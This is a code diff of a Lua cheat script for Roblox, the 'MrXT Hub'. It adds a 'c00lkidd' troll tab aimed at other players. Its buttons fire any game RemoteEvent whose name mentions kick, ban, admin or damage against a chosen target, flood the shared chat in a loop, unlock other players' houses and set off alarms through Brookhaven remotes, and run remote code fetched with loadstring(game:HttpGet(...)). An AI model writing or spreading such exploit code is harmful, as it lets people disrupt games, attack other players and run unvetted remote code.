@@ -109,14 +109,10 @@ end)
 
 -- // ABAS DO HUB
 
--- HOME (COM CONVITE DO DISCORD)
+-- HOME
 local home = window:CreateTab({ Name = "Home", Title = "Home", Icon = "rbxassetid://96457830014743" })
 home:AddSection("Welcome MrXT Hub")
-home:AddDiscordInvite({
-	Icon = "rbxassetid://96866982801235",
-	ServerName = "MrXT Hub",
-	Link = "https://discord.gg/v3GFFNDj9",
-})
+home:AddButton({ Name = "Copy Discord Server", Callback = function() setclipboard("https://discord.gg/v3GFFNDj9") end })
 
 -- COMBAT
 local combat = window:CreateTab({ Name = "Combat", Title = "Combat", Icon = "rbxassetid://96457830014743" })
@@ -174,69 +170,111 @@ utils:AddButton({ Name = "Server Hop", Callback = function()
     for _, v in pairs(x.data) do if v.playing < v.maxPlayers then game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, v.id) end end
 end })
 
--- c00lkidd
+-- // c00lkidd (SUPER ABA - TUDO INCLUÍDO)
 local c00lkidd = window:CreateTab({ Name = "c00lkidd", Title = "c00lkidd", Icon = "rbxassetid://96457830014743" })
 
-c00lkidd:AddSection("Troll Scripts")
+local selectedPlayer = ""
+local function getPlayers()
+    local p = {}
+    for _, v in pairs(game.Players:GetPlayers()) do table.insert(p, v.Name) end
+    return p
+end
 
-c00lkidd:AddButton({ Name = "Decal Spam", Callback = function()
+local pDrop = c00lkidd:AddDropdown({ Name = "Select Target", Options = getPlayers(), Default = "None", Callback = function(v) selectedPlayer = v end })
+
+c00lkidd:AddButton({ Name = "Refresh Player List", Callback = function() pDrop:SetOptions(getPlayers()) end })
+
+c00lkidd:AddSection("Universal Chaos")
+
+c00lkidd:AddButton({ Name = "Decal Spam (FE Universal)", Callback = function()
     local decalID = 8408806737
-    local function exPro(root)
-        for _, v in pairs(root:GetChildren()) do
-            if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id="..decalID then
-                v.Parent = nil
-            elseif v:IsA("BasePart") then
-                v.Material = "Plastic"
-                v.Transparency = 0
-                for i = 1, 6 do
-                    local d = Instance.new("Decal", v)
-                    d.Texture = "http://www.roblox.com/asset/?id="..decalID
-                    if i == 1 then d.Face = "Front"
-                    elseif i == 2 then d.Face = "Back"
-                    elseif i == 3 then d.Face = "Right"
-                    elseif i == 4 then d.Face = "Left"
-                    elseif i == 5 then d.Face = "Top"
-                    elseif i == 6 then d.Face = "Bottom" end
-                end
-            end
-            exPro(v)
+    -- Tenta via Remotes de Brookhaven (TVs/Quadros)
+    local re = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
+    if re then re:FireServer("UpdateHousePicture", decalID) end
+    
+    -- Tenta via Remotes de Pintura Comuns em outros jogos
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") and (v.Name:find("Paint") or v.Name:find("Texture") or v.Name:find("Decal")) then
+            v:FireServer(decalID)
+            v:FireServer("Sky", decalID)
         end
     end
-    exPro(game.Workspace)
-    local s = Instance.new("Sky", game.Lighting)
-    s.SkyboxBk = "http://www.roblox.com/asset/?id="..decalID
-    s.SkyboxDn = "http://www.roblox.com/asset/?id="..decalID
-    s.SkyboxFt = "http://www.roblox.com/asset/?id="..decalID
-    s.SkyboxLf = "http://www.roblox.com/asset/?id="..decalID
-    s.SkyboxRt = "http://www.roblox.com/asset/?id="..decalID
-    s.SkyboxUp = "http://www.roblox.com/asset/?id="..decalID
-    game.Lighting.TimeOfDay = 12
+    -- Efeito Visual Local (Todos os objetos viram c00lkidd para você)
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj:IsA("BasePart") then
+            local d = Instance.new("Decal", obj)
+            d.Texture = "rbxassetid://"..decalID
+        end
+    end
+end })
+
+c00lkidd:AddButton({ Name = "Universal Kick/Crash Target", Callback = function()
+    local target = game.Players:FindFirstChild(selectedPlayer)
+    if target then
+        for _, v in pairs(game:GetDescendants()) do
+            if v:IsA("RemoteEvent") and (v.Name:lower():find("kick") or v.Name:lower():find("ban") or v.Name:lower():find("admin")) then
+                v:FireServer(target, "Exploit Detected")
+            end
+        end
+    end
+end })
+
+c00lkidd:AddButton({ Name = "Kill Target (FE Check)", Callback = function()
+    local target = game.Players:FindFirstChild(selectedPlayer)
+    if target and target.Character then
+        for _, v in pairs(game:GetDescendants()) do
+            if v:IsA("RemoteEvent") and (v.Name:lower():find("damage") or v.Name:lower():find("hit")) then
+                v:FireServer(target.Character.Humanoid, 9e9)
+            end
+        end
+    end
+end })
+
+c00lkidd:AddButton({ Name = "Server Lag (Safe Flood)", Callback = function()
     task.spawn(function()
-        while true do
-            game.Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
-            task.wait(0.2)
-            game.Lighting.ShadowColor = Color3.new(math.random(), math.random(), math.random())
-            task.wait(0.2)
+        while task.wait(0.6) do
+            local re = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+            if re then re.SayMessageRequest:FireServer(string.rep("c00lkidd ", 25), "All") end
         end
     end)
 end })
 
-c00lkidd:AddButton({ Name = "JOHN DOE", Callback = function()
-    local redSkyboxAssetId = "rbxassetid://1012887"
+c00lkidd:AddSection("Brookhaven Specials")
+
+c00lkidd:AddButton({ Name = "Unlock All House Doors", Callback = function()
+    local re = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
+    if re then re:FireServer("HouseLock", false) end
+end })
+
+c00lkidd:AddButton({ Name = "Fire All House Alarms", Callback = function()
+    local re = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
+    if re then re:FireServer("HouseAlarm", true) end
+end })
+
+c00lkidd:AddButton({ Name = "Brookhaven IceHub (Full Admin)", Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IceBear03/IceHub/main/IceHubBrookhaven.lua"))()
+end })
+
+c00lkidd:AddSection("Atmosphere Trolls")
+
+c00lkidd:AddButton({ Name = "JOHN DOE Theme", Callback = function()
     local sky = game.Lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", game.Lighting)
-    sky.SkyboxBk = redSkyboxAssetId
-    sky.SkyboxDn = redSkyboxAssetId
-    sky.SkyboxFt = redSkyboxAssetId
-    sky.SkyboxLf = redSkyboxAssetId
-    sky.SkyboxRt = redSkyboxAssetId
-    sky.SkyboxUp = redSkyboxAssetId
-    local backgroundSound = game:GetService("SoundService"):FindFirstChild("PersistentBGSound") or Instance.new("Sound", game:GetService("SoundService"))
-    backgroundSound.Name = "PersistentBGSound"
-    backgroundSound.SoundId = "rbxassetid://19094700"
-    backgroundSound.PlaybackSpeed = 0.221
-    backgroundSound.Looped = true
-    backgroundSound.Volume = 1
-    backgroundSound:Play()
+    sky.SkyboxBk = "rbxassetid://1012887" sky.SkyboxDn = "rbxassetid://1012887"
+    sky.SkyboxFt = "rbxassetid://1012887" sky.SkyboxLf = "rbxassetid://1012887"
+    sky.SkyboxRt = "rbxassetid://1012887" sky.SkyboxUp = "rbxassetid://1012887"
+    game.Lighting.FogColor = Color3.new(1, 0, 0)
+    game.Lighting.FogEnd = 100
+    local s = Instance.new("Sound", game.Workspace)
+    s.SoundId = "rbxassetid://19094700" s.Volume = 2 s.Looped = true s:Play()
+end })
+
+c00lkidd:AddButton({ Name = "Spectate Target", Callback = function()
+    local target = game.Players:FindFirstChild(selectedPlayer)
+    if target and target.Character then camera.CameraSubject = target.Character.Humanoid end
+end })
+
+c00lkidd:AddButton({ Name = "Reset Camera", Callback = function()
+    camera.CameraSubject = player.Character.Humanoid
 end })
 
 window:Notify({ Title = "MrXT Hub", Text = "All features are ready!", Duration = 5 })
